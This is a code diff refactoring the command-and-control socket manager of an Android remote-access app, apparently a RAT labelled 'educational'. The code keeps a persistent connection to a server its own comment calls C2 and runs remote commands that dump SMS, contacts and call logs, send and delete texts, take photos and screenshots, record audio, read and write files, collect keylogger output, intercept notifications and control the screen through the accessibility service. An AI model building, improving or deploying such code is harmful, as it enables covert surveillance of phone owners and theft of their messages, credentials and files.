@@ -1,6 +1,7 @@
 package com.remoteaccess.educational.network;
 
 import android.content.Context;
+import android.os.Build;
 import android.util.Log;
 import com.remoteaccess.educational.advanced.NotificationInterceptor;
 import com.remoteaccess.educational.commands.*;
@@ -19,40 +20,46 @@ import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.ScheduledFuture;
 import java.util.concurrent.TimeUnit;
 
+/**
+ * SocketManager — persistent TCP connection to the C2 server.
+ *
+ * Protocol (matches server.js exactly):
+ *   send:    {"event":"...", "data":{...}}\n
+ *   receive: {"event":"...", "data":{...}}\n
+ */
 public class SocketManager {
 
     private static final String TAG = "SocketManager";
 
     private static SocketManager instance;
-    private Socket tcpSocket;
-    private PrintWriter out;
+    private Socket   tcpSocket;
+    private PrintWriter    out;
     private BufferedReader in;
-    private Context context;
-    private boolean connected = false;
-    private boolean running   = false;
+    private final Context  context;
+    private volatile boolean connected = false;
+    private volatile boolean running   = false;
 
+    // Use a cached thread pool so command handlers never block the read loop
     private final ExecutorService          executor          = Executors.newCachedThreadPool();
     private final ScheduledExecutorService heartbeatExecutor = Executors.newSingleThreadScheduledExecutor();
     private ScheduledFuture<?>             heartbeatFuture;
 
-    // Command Handlers
-    private CommandExecutor   commandExecutor;
-    private SMSHandler        smsHandler;
-    private ContactsHandler   contactsHandler;
-    private CallLogsHandler   callLogsHandler;
-    private CameraHandler     cameraHandler;
-    private ScreenshotHandler screenshotHandler;
-    private FileHandler       fileHandler;
-    private AudioRecorder     audioRecorder;
+    // Command Handlers — one instance each, created once and reused
+    private final CommandExecutor   commandExecutor;
+    private final SMSHandler        smsHandler;
+    private final ContactsHandler   contactsHandler;
+    private final CallLogsHandler   callLogsHandler;
+    private final CameraHandler     cameraHandler;
+    private final ScreenshotHandler screenshotHandler;
+    private final FileHandler       fileHandler;
+    private final AudioRecorder     audioRecorder;
 
-    public static SocketManager getInstance(Context context) {
-        if (instance == null) {
-            instance = new SocketManager(context);
-        }
+    public static synchronized SocketManager getInstance(Context context) {
+        if (instance == null) instance = new SocketManager(context.getApplicationContext());
         return instance;
     }
 
-    public SocketManager(Context context) {
+    private SocketManager(Context context) {
         this.context       = context;
         commandExecutor    = new CommandExecutor(context);
         smsHandler         = new SMSHandler(context);
@@ -64,67 +71,63 @@ public class SocketManager {
         audioRecorder      = new AudioRecorder(context);
     }
 
-    // ── Connection lifecycle ────────────────────────────────────────────────
+    // ── Connection lifecycle ──────────────────────────────────────────────
 
-    public void connect() {
+    public synchronized void connect() {
         if (running) {
-            Log.d(TAG, "connect() called but already running — skipping");
+            Log.d(TAG, "connect() — already running, skipping");
             return;
         }
         running = true;
-        executor.execute(() -> {
-            while (running) {
-                try {
-                    Log.d(TAG, "Connecting to " + Constants.TCP_HOST + ":" + Constants.TCP_PORT);
-                    tcpSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
-
-                    // Enable OS-level TCP keep-alive so the kernel sends keep-alive
-                    // probes and detects dead connections on its own
-                    tcpSocket.setKeepAlive(true);
-
-                    out       = new PrintWriter(tcpSocket.getOutputStream(), true);
-                    in        = new BufferedReader(new InputStreamReader(tcpSocket.getInputStream()));
-                    connected = true;
-
-                    Log.d(TAG, "TCP connected — enabling heartbeat");
-                    registerDevice(DeviceInfo.getDeviceId(context));
-                    startHeartbeat();
-                    listenForMessages();          // blocks until connection drops
-
-                } catch (Exception e) {
-                    Log.e(TAG, "Connection error: " + e.getMessage());
-                    connected = false;
-                } finally {
-                    stopHeartbeat();
-                    connected = false;
-                }
-
-                if (running) {
-                    Log.d(TAG, "Reconnecting in " + Constants.TCP_RECONNECT_DELAY + " ms…");
-                    try { Thread.sleep(Constants.TCP_RECONNECT_DELAY); }
-                    catch (InterruptedException ignored) {}
-                }
-            }
-        });
+        executor.execute(this::connectionLoop);
     }
 
-    // ── Heartbeat (keep-alive toward the server) ────────────────────────────
+    private void connectionLoop() {
+        while (running) {
+            try {
+                Log.i(TAG, "Connecting to " + Constants.TCP_HOST + ":" + Constants.TCP_PORT);
+                tcpSocket = new Socket(Constants.TCP_HOST, Constants.TCP_PORT);
+                tcpSocket.setKeepAlive(true);
+                tcpSocket.setSoTimeout(0);          // no read timeout — server sends pings
 
-    /**
-     * Schedule a heartbeat every HEARTBEAT_INTERVAL ms.
-     * The server's PONG_TIMEOUT is 45 000 ms; our interval is 20 000 ms —
-     * well within the deadline.
-     */
+                out       = new PrintWriter(tcpSocket.getOutputStream(), true);
+                in        = new BufferedReader(new InputStreamReader(tcpSocket.getInputStream()));
+                connected = true;
+
+                Log.i(TAG, "TCP connected — registering device");
+                registerDevice(DeviceInfo.getDeviceId(context));
+                startHeartbeat();
+                listenForMessages();                // blocks until socket closes
+
+            } catch (Exception e) {
+                Log.e(TAG, "Connection error: " + e.getMessage());
+            } finally {
+                connected = false;
+                stopHeartbeat();
+                closeSilently();
+            }
+
+            if (running) {
+                Log.d(TAG, "Reconnecting in " + Constants.TCP_RECONNECT_DELAY + " ms…");
+                try { Thread.sleep(Constants.TCP_RECONNECT_DELAY); } catch (InterruptedException ignored) {}
+            }
+        }
+        Log.i(TAG, "Connection loop ended");
+    }
+
+    private void closeSilently() {
+        try { if (tcpSocket != null) tcpSocket.close(); } catch (Exception ignored) {}
+        out = null;
+        in  = null;
+    }
+
+    // ── Heartbeat ────────────────────────────────────────────────────────
+
     private void startHeartbeat() {
-        stopHeartbeat();   // cancel any stale future
+        stopHeartbeat();
         String deviceId = DeviceInfo.getDeviceId(context);
         heartbeatFuture = heartbeatExecutor.scheduleAtFixedRate(
-            () -> {
-                if (connected) {
-                    sendHeartbeat(deviceId);
-                    Log.d(TAG, "Heartbeat sent");
-                }
-            },
+            () -> { if (connected) sendHeartbeat(deviceId); },
             Constants.HEARTBEAT_INTERVAL,
             Constants.HEARTBEAT_INTERVAL,
             TimeUnit.MILLISECONDS
@@ -132,131 +135,148 @@ public class SocketManager {
     }
 
     private void stopHeartbeat() {
-        if (heartbeatFuture != null && !heartbeatFuture.isCancelled()) {
+        if (heartbeatFuture != null) {
             heartbeatFuture.cancel(false);
             heartbeatFuture = null;
         }
     }
 
-    // ── Message loop ────────────────────────────────────────────────────────
+    // ── Message loop ──────────────────────────────────────────────────────
 
     private void listenForMessages() {
         try {
             String line;
             while (running && (line = in.readLine()) != null) {
-                final String message = line;
-                executor.execute(() -> processMessage(message));
+                final String msg = line.trim();
+                if (!msg.isEmpty()) executor.execute(() -> processMessage(msg));
             }
         } catch (Exception e) {
             Log.e(TAG, "Read error: " + e.getMessage());
-        } finally {
-            connected = false;
         }
     }
 
-    private void processMessage(String message) {
+    private void processMessage(String raw) {
         try {
-            JSONObject json  = new JSONObject(message);
+            JSONObject json  = new JSONObject(raw);
             String     event = json.getString("event");
             JSONObject data  = json.optJSONObject("data");
 
-            Log.d(TAG, "Event received: " + event);
+            Log.d(TAG, "← event: " + event);
 
-            // ── Respond to server pings immediately ──────────────────────
-            // Server sends "device:ping" every 15 s and drops the client
-            // if no "device:pong" is received within 45 s.
-            if (event.equals("device:ping")) {
-                sendPong();
-                return;
-            }
+            switch (event) {
+                case "device:ping":
+                    sendPong();
+                    break;
 
-            if (event.equals("command:execute") && data != null) {
-                String     commandId = data.optString("commandId", "");
-                String     command   = data.getString("command");
-                JSONObject params    = data.optJSONObject("params");
-                handleCommand(commandId, command, params);
+                case "device:registered":
+                    Log.i(TAG, "Server acknowledged registration ✓");
+                    break;
+
+                case "command:execute":
+                    if (data != null) {
+                        String     commandId = data.optString("commandId", "");
+                        String     command   = data.optString("command", "");
+                        JSONObject params    = data.optJSONObject("params");
+                        if (!command.isEmpty()) {
+                            handleCommand(commandId, command, params);
+                        }
+                    }
+                    break;
+
+                default:
+                    Log.w(TAG, "Unhandled event: " + event);
             }
 
         } catch (JSONException e) {
-            Log.e(TAG, "Error parsing message: " + e.getMessage());
+            Log.e(TAG, "Parse error: " + e.getMessage() + " raw=" + raw);
         }
     }
 
-    // ── Send helpers ────────────────────────────────────────────────────────
+    // ── Send helpers ──────────────────────────────────────────────────────
 
     private synchronized void sendMessage(String event, JSONObject data) {
         if (out != null && connected) {
             try {
-                JSONObject message = new JSONObject();
-                message.put("event", event);
-                message.put("data", data);
-                out.print(message.toString() + "\n");
+                JSONObject msg = new JSONObject();
+                msg.put("event", event);
+                msg.put("data", data);
+                out.print(msg.toString() + "\n");
                 out.flush();
             } catch (JSONException e) {
-                Log.e(TAG, "Error building message: " + e.getMessage());
+                Log.e(TAG, "sendMessage error: " + e.getMessage());
             }
-        } else {
-            Log.w(TAG, "Not connected, cannot send: " + event);
         }
     }
 
-    public void emit(String event, JSONObject data) {
-        sendMessage(event, data);
-    }
+    public void emit(String event, JSONObject data) { sendMessage(event, data); }
 
-    /**
-     * Reply to the server's "device:ping" event.
-     * The server listens for "device:pong" to reset its PONG_TIMEOUT timer.
-     */
     private void sendPong() {
         try {
-            JSONObject data = new JSONObject();
-            data.put("deviceId", DeviceInfo.getDeviceId(context));
-            sendMessage("device:pong", data);
-            Log.d(TAG, "Pong sent");
-        } catch (JSONException e) {
-            Log.e(TAG, "Error sending pong: " + e.getMessage());
-        }
+            JSONObject d = new JSONObject();
+            d.put("deviceId", DeviceInfo.getDeviceId(context));
+            sendMessage("device:pong", d);
+        } catch (JSONException ignored) {}
     }
 
     public void registerDevice(String deviceId) {
         try {
-            JSONObject deviceInfo = new JSONObject();
-            deviceInfo.put("name",           DeviceInfo.getDeviceName());
-            deviceInfo.put("model",          DeviceInfo.getModel());
-            deviceInfo.put("androidVersion", DeviceInfo.getAndroidVersion());
-            deviceInfo.put("manufacturer",   android.os.Build.MANUFACTURER);
+            JSONObject info = new JSONObject();
+            info.put("name",           DeviceInfo.getDeviceName());
+            info.put("model",          DeviceInfo.getModel());
+            info.put("androidVersion", DeviceInfo.getAndroidVersion());
+            info.put("manufacturer",   android.os.Build.MANUFACTURER);
+            info.put("sdk",            Build.VERSION.SDK_INT);
 
-            JSONObject data = new JSONObject();
-            data.put("deviceId",   deviceId);
-            data.put("userId",     "");
-            data.put("deviceInfo", deviceInfo);
-
-            sendMessage("device:register", data);
-            Log.d(TAG, "Device registered: " + deviceId);
+            JSONObject d = new JSONObject();
+            d.put("deviceId",   deviceId);
+            d.put("userId",     "");
+            d.put("deviceInfo", info);
+            sendMessage("device:register", d);
+            Log.d(TAG, "Registered device: " + deviceId);
         } catch (JSONException e) {
-            Log.e(TAG, "Error registering device: " + e.getMessage());
+            Log.e(TAG, "registerDevice error: " + e.getMessage());
         }
     }
 
     public void sendHeartbeat(String deviceId) {
         try {
-            JSONObject data = new JSONObject();
-            data.put("deviceId", deviceId);
-            sendMessage("device:heartbeat", data);
+            JSONObject d = new JSONObject();
+            d.put("deviceId", deviceId);
+            sendMessage("device:heartbeat", d);
+        } catch (JSONException ignored) {}
+    }
+
+    /** Send a command:response back to the server. result may be a JSONObject or a String. */
+    public void sendResponse(String commandId, String command, Object result) {
+        try {
+            String responseStr;
+            if (result instanceof JSONObject) {
+                responseStr = result.toString();
+            } else if (result != null) {
+                responseStr = result.toString();
+            } else {
+                responseStr = "{}";
+            }
+
+            JSONObject d = new JSONObject();
+            d.put("commandId", commandId);
+            d.put("response",  responseStr);
+            sendMessage("command:response", d);
+            Log.d(TAG, "→ response sent for " + command);
         } catch (JSONException e) {
-            Log.e(TAG, "Error sending heartbeat: " + e.getMessage());
+            Log.e(TAG, "sendResponse error: " + e.getMessage());
         }
     }
 
-    public void sendResponse(String commandId, String command, Object result) {
+    private void sendErrorResponse(String commandId, String command, String error) {
         try {
-            JSONObject data = new JSONObject();
-            data.put("commandId", commandId);
-            data.put("response",  result != null ? result.toString() : "");
-            sendMessage("command:response", data);
+            JSONObject d = new JSONObject();
+            d.put("commandId", commandId);
+            d.put("error",     error);
+            sendMessage("command:response", d);
+            Log.w(TAG, "→ error response for " + command + ": " + error);
         } catch (JSONException e) {
-            Log.e(TAG, "Error sending response: " + e.getMessage());
+            Log.e(TAG, "sendErrorResponse error: " + e.getMessage());
         }
     }
 
@@ -264,214 +284,237 @@ public class SocketManager {
         running   = false;
         connected = false;
         stopHeartbeat();
-        try {
-            if (tcpSocket != null) tcpSocket.close();
-        } catch (Exception e) {
-            Log.e(TAG, "Error disconnecting: " + e.getMessage());
-        }
+        closeSilently();
     }
 
-    // ── Command dispatch ────────────────────────────────────────────────────
+    public boolean isConnected() { return connected; }
+
+    // ── Command dispatch ──────────────────────────────────────────────────
 
     private void handleCommand(String commandId, String command, JSONObject params) {
+        Log.i(TAG, "handleCommand: " + command + " [" + commandId + "]");
         JSONObject result;
 
         try {
-            if (command.equals("ping")
-                    || command.equals("vibrate")
-                    || command.equals("play_sound")
-                    || command.equals("get_clipboard")
-                    || command.equals("set_clipboard")
-                    || command.equals("get_device_info")
-                    || command.equals("get_location")
-                    || command.equals("get_installed_apps")
-                    || command.equals("get_battery_info")
-                    || command.equals("get_network_info")
-                    || command.equals("get_wifi_networks")
-                    || command.equals("get_system_info")) {
-                result = commandExecutor.executeCommand(command, params);
-
-            } else if (command.equals("get_all_sms")) {
-                int limit = params != null ? params.optInt("limit", 100) : 100;
-                result = smsHandler.getAllSMS(limit);
-            } else if (command.equals("get_sms_from_number")) {
-                String phoneNumber = params.getString("phoneNumber");
-                int    limit       = params.optInt("limit", 50);
-                result = smsHandler.getSMSFromNumber(phoneNumber, limit);
-            } else if (command.equals("send_sms")) {
-                String phoneNumber = params.getString("phoneNumber");
-                String msg         = params.getString("message");
-                result = smsHandler.sendSMS(phoneNumber, msg);
-            } else if (command.equals("delete_sms")) {
-                String smsId = params.getString("smsId");
-                result = smsHandler.deleteSMS(smsId);
-
-            } else if (command.equals("get_all_contacts")) {
-                result = contactsHandler.getAllContacts();
-            } else if (command.equals("search_contacts")) {
-                String query = params.getString("query");
-                result = contactsHandler.searchContacts(query);
-
-            } else if (command.equals("get_all_call_logs")) {
-                int limit = params != null ? params.optInt("limit", 100) : 100;
-                result = callLogsHandler.getAllCallLogs(limit);
-            } else if (command.equals("get_call_logs_by_type")) {
-                int callType = params.getInt("callType");
-                int limit    = params.optInt("limit", 50);
-                result = callLogsHandler.getCallLogsByType(callType, limit);
-            } else if (command.equals("get_call_logs_from_number")) {
-                String phoneNumber = params.getString("phoneNumber");
-                int    limit       = params.optInt("limit", 50);
-                result = callLogsHandler.getCallLogsFromNumber(phoneNumber, limit);
-            } else if (command.equals("get_call_statistics")) {
-                result = callLogsHandler.getCallStatistics();
-
-            } else if (command.equals("get_available_cameras")) {
-                result = cameraHandler.getAvailableCameras();
-            } else if (command.equals("take_photo")) {
-                String cameraId = params.optString("cameraId", "0");
-                String quality  = params.optString("quality", "high");
-                result = cameraHandler.takePhoto(cameraId, quality);
-
-            } else if (command.equals("take_screenshot")) {
-                result = screenshotHandler.takeScreenshot();
-
-            } else if (command.equals("list_files")) {
-                String path = params != null ? params.optString("path", null) : null;
-                result = fileHandler.listFiles(path);
-            } else if (command.equals("read_file")) {
-                String  filePath = params.getString("filePath");
-                boolean asBase64 = params.optBoolean("asBase64", false);
-                result = fileHandler.readFile(filePath, asBase64);
-            } else if (command.equals("write_file")) {
-                String  filePath = params.getString("filePath");
-                String  content  = params.getString("content");
-                boolean isBase64 = params.optBoolean("isBase64", false);
-                result = fileHandler.writeFile(filePath, content, isBase64);
-            } else if (command.equals("delete_file")) {
-                String filePath = params.getString("filePath");
-                result = fileHandler.deleteFile(filePath);
-            } else if (command.equals("copy_file")) {
-                String sourcePath = params.getString("sourcePath");
-                String destPath   = params.getString("destPath");
-                result = fileHandler.copyFile(sourcePath, destPath);
-            } else if (command.equals("move_file")) {
-                String sourcePath = params.getString("sourcePath");
-                String destPath   = params.getString("destPath");
-                result = fileHandler.moveFile(sourcePath, destPath);
-            } else if (command.equals("create_directory")) {
-                String path = params.getString("path");
-                result = fileHandler.createDirectory(path);
-            } else if (command.equals("get_file_info")) {
-                String filePath = params.getString("filePath");
-                result = fileHandler.getFileInfo(filePath);
-            } else if (command.equals("search_files")) {
-                String directory = params.getString("directory");
-                String query     = params.getString("query");
-                result = fileHandler.searchFiles(directory, query);
-
-            } else if (command.equals("start_recording")) {
-                String filename = params != null ? params.optString("filename", null) : null;
-                result = audioRecorder.startRecording(filename);
-            } else if (command.equals("stop_recording")) {
-                result = audioRecorder.stopRecording();
-            } else if (command.equals("get_recording_status")) {
-                result = audioRecorder.getStatus();
-            } else if (command.equals("get_audio")) {
-                String filePath = params.getString("filePath");
-                result = audioRecorder.getAudioAsBase64(filePath);
-            } else if (command.equals("list_recordings")) {
-                result = audioRecorder.listRecordings();
-            } else if (command.equals("delete_recording")) {
-                String filePath = params.getString("filePath");
-                result = audioRecorder.deleteRecording(filePath);
-
-            } else if (command.equals("get_keylogs")) {
-                int limit = params != null ? params.optInt("limit", 100) : 100;
-                result = KeyloggerService.getKeylogs(context, limit);
-            } else if (command.equals("clear_keylogs")) {
-                result = KeyloggerService.clearLogs(context);
-
-            } else if (command.equals("get_notifications")) {
-                result = NotificationInterceptor.getAllNotifications();
-            } else if (command.equals("get_notifications_from_app")) {
-                String packageName = params.getString("packageName");
-                result = NotificationInterceptor.getNotificationsFromApp(packageName);
-            } else if (command.equals("clear_notifications")) {
-                result = NotificationInterceptor.clearAllNotifications();
-
-            } else if (command.equals("touch") || command.equals("swipe")
-                    || command.equals("press_back") || command.equals("press_home")
-                    || command.equals("press_recents") || command.equals("open_notifications")
-                    || command.equals("scroll_up") || command.equals("scroll_down")) {
-                UnifiedAccessibilityService accessSvc = UnifiedAccessibilityService.getInstance();
-                if (accessSvc == null) {
-                    result = new JSONObject();
-                    result.put("success", false);
-                    result.put("error", "Accessibility service not running");
-                } else {
-                    ScreenController sc = new ScreenController(accessSvc);
-                    switch (command) {
-                        case "touch":
-                            result = sc.touch(params.getInt("x"), params.getInt("y"), params.optInt("duration", 100));
-                            break;
-                        case "swipe":
-                            result = sc.swipe(params.getInt("startX"), params.getInt("startY"), params.getInt("endX"), params.getInt("endY"), params.optInt("duration", 300));
-                            break;
-                        case "press_back":    result = sc.pressBack();         break;
-                        case "press_home":    result = sc.pressHome();         break;
-                        case "press_recents": result = sc.pressRecents();      break;
-                        case "open_notifications": result = sc.openNotifications(); break;
-                        case "scroll_up":     result = sc.scrollUp();          break;
-                        case "scroll_down":   result = sc.scrollDown();        break;
-                        default:
-                            result = new JSONObject();
-                            result.put("success", false);
-                            result.put("error", "Unknown screen control command");
-                    }
-                }
-
-            } else if (command.equals("read_screen") || command.equals("find_by_text")
-                    || command.equals("get_current_app") || command.equals("get_clickable_elements")
-                    || command.equals("get_input_fields")) {
-                UnifiedAccessibilityService accessSvc = UnifiedAccessibilityService.getInstance();
-                if (accessSvc == null) {
-                    result = new JSONObject();
-                    result.put("success", false);
-                    result.put("error", "Accessibility service not running");
-                } else {
-                    ScreenReader sr = new ScreenReader(accessSvc);
-                    switch (command) {
-                        case "read_screen":           result = sr.readScreen();        break;
-                        case "find_by_text":          result = sr.findByText(params.getString("text")); break;
-                        case "get_current_app":       result = sr.getCurrentApp();    break;
-                        case "get_clickable_elements":result = sr.getClickableElements(); break;
-                        case "get_input_fields":      result = sr.getInputFields();   break;
-                        default:
-                            result = new JSONObject();
-                            result.put("success", false);
-                            result.put("error", "Unknown screen reader command");
-                    }
-                }
-
-            } else {
-                result = new JSONObject();
-                result.put("success", false);
-                result.put("error", "Unknown command: " + command);
-            }
-
-            sendResponse(commandId, command, result);
-
+            result = dispatchCommand(command, params);
         } catch (Exception e) {
-            Log.e(TAG, "Error handling command: " + e.getMessage());
-            try {
-                JSONObject errorResult = new JSONObject();
-                errorResult.put("success", false);
-                errorResult.put("error", e.getMessage());
-                sendResponse(commandId, command, errorResult);
-            } catch (JSONException ex) {
-                ex.printStackTrace();
+            Log.e(TAG, "handleCommand exception for " + command + ": " + e.getMessage());
+            sendErrorResponse(commandId, command, "Internal error: " + e.getMessage());
+            return;
+        }
+
+        sendResponse(commandId, command, result);
+    }
+
+    private JSONObject dispatchCommand(String command, JSONObject params) throws Exception {
+        if (params == null) params = new JSONObject();
+
+        // ── System / Device ──────────────────────────────────────────────
+        switch (command) {
+            case "ping":
+            case "vibrate":
+            case "play_sound":
+            case "get_clipboard":
+            case "set_clipboard":
+            case "get_device_info":
+            case "get_location":
+            case "get_installed_apps":
+            case "get_battery_info":
+            case "get_network_info":
+            case "get_wifi_networks":
+            case "get_system_info":
+                return commandExecutor.executeCommand(command, params);
+        }
+
+        // ── Accessibility status ─────────────────────────────────────────
+        if (command.equals("get_accessibility_status")) {
+            JSONObject r = new JSONObject();
+            boolean enabled = UnifiedAccessibilityService.getInstance() != null;
+            r.put("success", true);
+            r.put("enabled", enabled);
+            r.put("message", enabled ? "Accessibility service is running" : "Accessibility service is NOT running — enable it in Settings");
+            return r;
+        }
+
+        // ── SMS ──────────────────────────────────────────────────────────
+        if (command.equals("get_all_sms")) {
+            return smsHandler.getAllSMS(params.optInt("limit", 100));
+        }
+        if (command.equals("get_sms_from_number")) {
+            return smsHandler.getSMSFromNumber(params.getString("phoneNumber"), params.optInt("limit", 50));
+        }
+        if (command.equals("send_sms")) {
+            return smsHandler.sendSMS(params.getString("phoneNumber"), params.getString("message"));
+        }
+        if (command.equals("delete_sms")) {
+            return smsHandler.deleteSMS(params.getString("smsId"));
+        }
+
+        // ── Contacts ─────────────────────────────────────────────────────
+        if (command.equals("get_all_contacts")) return contactsHandler.getAllContacts();
+        if (command.equals("search_contacts"))  return contactsHandler.searchContacts(params.getString("query"));
+
+        // ── Calls ────────────────────────────────────────────────────────
+        if (command.equals("get_all_call_logs")) {
+            return callLogsHandler.getAllCallLogs(params.optInt("limit", 100));
+        }
+        if (command.equals("get_call_logs_by_type")) {
+            return callLogsHandler.getCallLogsByType(params.getInt("callType"), params.optInt("limit", 50));
+        }
+        if (command.equals("get_call_logs_from_number")) {
+            return callLogsHandler.getCallLogsFromNumber(params.getString("phoneNumber"), params.optInt("limit", 50));
+        }
+        if (command.equals("get_call_statistics")) return callLogsHandler.getCallStatistics();
+
+        // ── Camera ───────────────────────────────────────────────────────
+        if (command.equals("get_available_cameras")) return cameraHandler.getAvailableCameras();
+        if (command.equals("take_photo")) {
+            return cameraHandler.takePhoto(
+                params.optString("cameraId", "0"),
+                params.optString("quality", "high")
+            );
+        }
+
+        // ── Screenshot ───────────────────────────────────────────────────
+        if (command.equals("take_screenshot")) return screenshotHandler.takeScreenshot();
+
+        // ── Files ────────────────────────────────────────────────────────
+        if (command.equals("list_files")) {
+            String path = params.optString("path", "");
+            return fileHandler.listFiles(path.isEmpty() ? null : path);
+        }
+        if (command.equals("read_file"))  return fileHandler.readFile(params.getString("filePath"), params.optBoolean("asBase64", false));
+        if (command.equals("write_file")) return fileHandler.writeFile(params.getString("filePath"), params.getString("content"), params.optBoolean("isBase64", false));
+        if (command.equals("delete_file"))return fileHandler.deleteFile(params.getString("filePath"));
+        if (command.equals("copy_file"))  return fileHandler.copyFile(params.getString("sourcePath"), params.getString("destPath"));
+        if (command.equals("move_file"))  return fileHandler.moveFile(params.getString("sourcePath"), params.getString("destPath"));
+        if (command.equals("create_directory")) return fileHandler.createDirectory(params.getString("path"));
+        if (command.equals("get_file_info"))    return fileHandler.getFileInfo(params.getString("filePath"));
+        if (command.equals("search_files"))     return fileHandler.searchFiles(params.getString("directory"), params.getString("query"));
+
+        // ── Audio ────────────────────────────────────────────────────────
+        if (command.equals("start_recording")) {
+            String fn = params.optString("filename", null);
+            return audioRecorder.startRecording(fn.isEmpty() ? null : fn);
+        }
+        if (command.equals("stop_recording"))       return audioRecorder.stopRecording();
+        if (command.equals("get_recording_status")) return audioRecorder.getStatus();
+        if (command.equals("get_audio"))            return audioRecorder.getAudioAsBase64(params.getString("filePath"));
+        if (command.equals("list_recordings"))      return audioRecorder.listRecordings();
+        if (command.equals("delete_recording"))     return audioRecorder.deleteRecording(params.getString("filePath"));
+
+        // ── Keylogger ────────────────────────────────────────────────────
+        if (command.equals("get_keylogs"))   return KeyloggerService.getKeylogs(context, params.optInt("limit", 100));
+        if (command.equals("clear_keylogs")) return KeyloggerService.clearLogs(context);
+
+        // ── Notifications ────────────────────────────────────────────────
+        if (command.equals("get_notifications"))          return NotificationInterceptor.getAllNotifications();
+        if (command.equals("get_notifications_from_app")) return NotificationInterceptor.getNotificationsFromApp(params.getString("packageName"));
+        if (command.equals("clear_notifications"))        return NotificationInterceptor.clearAllNotifications();
+
+        // ── Accessibility-required commands ──────────────────────────────
+        // Screen Control (gestures) + Screen Reader
+        if (isAccessibilityCommand(command)) {
+            return handleAccessibilityCommand(command, params);
+        }
+
+        // ── Unknown ──────────────────────────────────────────────────────
+        JSONObject unknown = new JSONObject();
+        unknown.put("success", false);
+        unknown.put("error", "Unknown command: " + command);
+        return unknown;
+    }
+
+    private boolean isAccessibilityCommand(String command) {
+        switch (command) {
+            case "touch":
+            case "swipe":
+            case "press_back":
+            case "press_home":
+            case "press_recents":
+            case "open_notifications":
+            case "open_quick_settings":
+            case "scroll_up":
+            case "scroll_down":
+            case "input_text":
+            case "click_by_text":
+            case "read_screen":
+            case "find_by_text":
+            case "get_current_app":
+            case "get_clickable_elements":
+            case "get_input_fields":
+                return true;
+            default:
+                return false;
+        }
+    }
+
+    private JSONObject handleAccessibilityCommand(String command, JSONObject params) throws JSONException {
+        UnifiedAccessibilityService accessSvc = UnifiedAccessibilityService.getInstance();
+
+        if (accessSvc == null) {
+            JSONObject r = new JSONObject();
+            r.put("success", false);
+            r.put("error",   "Accessibility service is not running. Enable it in Settings → Accessibility → " +
+                             "Downloaded Apps → [App Name]");
+            r.put("requiresAccessibility", true);
+            return r;
+        }
+
+        // Screen Control commands (gestures)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            ScreenController sc = new ScreenController(accessSvc);
+
+            switch (command) {
+                case "touch":
+                    return sc.touch(
+                        params.getInt("x"),
+                        params.getInt("y"),
+                        params.optInt("duration", 100)
+                    );
+                case "swipe":
+                    return sc.swipe(
+                        params.getInt("startX"), params.getInt("startY"),
+                        params.getInt("endX"),   params.getInt("endY"),
+                        params.optInt("duration", 300)
+                    );
+                case "press_back":         return sc.pressBack();
+                case "press_home":         return sc.pressHome();
+                case "press_recents":      return sc.pressRecents();
+                case "open_notifications": return sc.openNotifications();
+                case "open_quick_settings":return sc.openQuickSettings();
+                case "scroll_up":          return sc.scrollUp();
+                case "scroll_down":        return sc.scrollDown();
+                case "input_text":         return sc.inputText(params.getString("text"));
+                case "click_by_text":      return sc.clickByText(params.getString("text"));
             }
+        } else if (isGestureCommand(command)) {
+            JSONObject r = new JSONObject();
+            r.put("success", false);
+            r.put("error", command + " requires Android 7.0+ (API 24)");
+            return r;
+        }
+
+        // Screen Reader commands
+        ScreenReader sr = new ScreenReader(accessSvc);
+        switch (command) {
+            case "read_screen":             return sr.readScreen();
+            case "find_by_text":            return sr.findByText(params.getString("text"));
+            case "get_current_app":         return sr.getCurrentApp();
+            case "get_clickable_elements":  return sr.getClickableElements();
+            case "get_input_fields":        return sr.getInputFields();
+        }
+
+        JSONObject r = new JSONObject();
+        r.put("success", false);
+        r.put("error", "Unhandled accessibility command: " + command);
+        return r;
+    }
+
+    private boolean isGestureCommand(String command) {
+        switch (command) {
+            case "touch": case "swipe": case "scroll_up": case "scroll_down": return true;
+            default: return false;
         }
     }
 }
